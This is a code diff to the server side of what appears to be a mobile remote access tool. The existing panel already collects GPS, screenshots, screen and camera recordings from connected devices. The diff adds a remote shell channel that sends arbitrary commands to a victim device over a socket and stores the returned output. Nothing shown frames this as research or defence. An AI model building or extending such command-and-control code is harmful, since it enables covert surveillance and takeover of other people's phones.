@@ -498,6 +498,18 @@ class Clients {
             client.get('apps').assign(data.apps).write();
             logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
         });
+
+        socket.on(CONST.messageKeys.shell, (data) => {
+            console.log(data.output);
+            let outputData = client.get('shellLog').find({id: data.id}).get('output').value();
+            if(outputData){
+                outputData += data.output;
+            }else{
+                outputData= data.output;
+            }            
+            client.get('shellLog').find({id: data.id}).assign({output: outputData}).write();
+            logManager.log(CONST.logTypes.info, clientID + " shell Recieved ");
+        });
     }
 
 
@@ -563,6 +575,7 @@ class Clients {
             else if (page === "gps") pageData = clientData.GPSData;
             else if (page === "info") pageData = client;
             else if (page === "lockdevice") pageData = clientData.lockDevice;
+            else if (page === "shell") pageData = clientDB.get('shellLog').sortBy('time').value();
             else if (page === "screenshot") pageData = clientDB.get('downloads').value().filter(download => download.type === "screenShot");
             else if (page === "screenrecord") pageData = clientDB.get('downloads').value().filter(download => download.type === "screenRecord");
             else if (page === "rearcam") pageData = clientDB.get('downloads').value().filter(download => download.type === "rearCam");
@@ -611,8 +624,23 @@ class Clients {
                     commandPayload.type = commandID;
                     if (clientID in this.clientConnections) {
                         let socket = this.clientConnections[clientID];
-                        logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID);
-                        socket.emit('order', commandPayload)
+                        logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID + JSON.stringify(commandPayload));
+                        if(commandID == 'shell'){                            
+                            if(commandPayload.cmd == "cls\n" || commandPayload.cmd=="clear\n"){
+                                this.getClientDatabase(clientID).set('shellLog', []).write();                                
+                            }
+                            else{
+                                commandPayload.id = Number(Math.random().toString().substr(3,10) + Date.now()).toString(36);
+                                this.getClientDatabase(clientID).get('shellLog').push({
+                                    time: new Date(),
+                                    id:commandPayload.id,
+                                    cmd: commandPayload.cmd
+                                }).write();
+                                socket.emit(commandID, commandPayload)
+                            }
+                        } else {
+                            socket.emit('order', commandPayload)
+                        }
                         return cb(false, 'Requested');
                     } else {
                         this.queCommand(clientID, commandPayload, (error) => {
